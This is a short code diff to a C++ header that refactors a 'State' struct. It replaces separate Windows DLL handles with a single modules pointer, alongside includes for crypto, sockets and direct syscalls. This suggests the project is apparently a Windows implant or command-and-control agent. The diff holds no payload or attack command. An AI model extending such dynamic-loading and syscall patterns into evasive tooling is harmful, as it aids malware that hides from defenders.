@@ -3,6 +3,7 @@
 
 #include "core/crypt.hpp"
 #include "core/socket.hpp"
+#include "core/modules.hpp"
 #include "core/parser.hpp"
 #include "core/procs.hpp"
 #include "core/syscalls.hpp"
@@ -25,19 +26,9 @@ namespace State
         PTEB                pTeb;
 
         // Module handlers
-        HMODULE             hAdvapi32DLL;
-        HMODULE             hBcryptDLL;
-        HMODULE             hCrypt32DLL;
-        HMODULE             hDbghelpDLL;
-        HMODULE             hIphlpapiDLL;
-        HMODULE             hKernel32DLL;
-        HMODULE             hNetapi32DLL;
-        HMODULE             hNTDLL;
-        HMODULE             hShell32DLL;
-        HMODULE             hUser32DLL;
-        HMODULE             hWinHTTPDLL;
+        Modules::PMODULES   pModules;
 
-        // Procedures loaded dynamatically (including syscalls)
+        // Functions
         Procs::PPROCS       pProcs;
 
         // wWinMain arguments
@@ -87,7 +78,7 @@ namespace State
         BOOL                bQuit;
     };
 
-    typedef STATE* PSTATE;
+    typedef STATE *PSTATE;
 
     VOID Free(PSTATE pState);
 }
